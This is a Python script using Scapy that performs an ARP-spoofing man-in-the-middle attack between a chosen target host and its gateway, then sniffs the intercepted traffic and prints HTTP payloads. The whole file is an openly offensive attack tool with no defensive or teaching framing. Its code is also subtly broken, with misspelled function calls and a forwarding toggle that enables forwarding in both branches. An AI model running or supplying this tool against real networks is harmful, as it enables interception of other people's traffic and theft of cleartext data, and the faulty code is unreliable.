import sys
from scapy.all import *

interface = input("[+]Enter Network Interface : ")
source_ip = input("[+]Enter Target IP: ")
destination_ip = input("[+]Enter Gateway Ip : ")

def getMAC(IP,interface):
    answered,unanswered = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout=5,iface=interface,inter=0.1)

    for send,recive in answered:
        return recive.sprintf(r"%Ether.src%")

def setIPForwarding(set):
    if set:
        os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
    else:
        os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
def resetARP(destination_ip,source_ip,interface):
    destinationMAC = getMAC(destination_ip, interface)
    sourceMAC = getMAC(source_ip, interface)

    send(ARP(op=2, pdst=source_ip, psrc=destination_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc = destinationMAC, retry=7))
    send(Arp(op=2, pdst=destination_ip, psrc=source_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc= sourceMAC, retry=7))

    setIPForwarding(False)

def mitm(destination_ip, destinationMAC,source_ip,sourceMAC):
    arp_dest_to_src = ARP(op=2,pdst=destination_ip,psrc=source_ip,hwdst=sourceMAC)
    arp_src_to_dest = ARP(op=2,pdst=source_ip,psrc = destination_ip,hwdst=destinationMAC)
    send(arp_dest_to_src)
    send(arp_src_to_dest)

def callBackParser(packet):
    if IP in packet:
        source_ip = packet[IP].src
        destination_ip = packet[IP].dst
        print("From: "+str(source_ip) + "to ->"+str(destination_ip))

        if TCP in packet:
            try:
                if packet[TCP].dport ==80 or packet[TCP].sport == 80:
                    print(packet[TCP].payload)
            except:
                pass
def main():
    setIPForarding(True)
    try:
        destinationMAC = getMac(destination_ip,interface)
    except Exception as e:
        setIPForwarding(False)
        print(e)
        sys.exit(1)
    try:
        sourceMAC = getMAC(source_ip, interface)
    except Exception as e:
        setIPForwarding(False)
        print(e)
        sys.exit(1)
    while True:
        try:
            mitm(destination_ip,destinationMAC,source_ip,sourceMAC)
            sniff(iface=interface,prn=callBackParser,count=10)
        except KeyboardInterrupt:
            resetARP(destination_ip, source_ip, interface)
            break
    sys.exit(1)
main()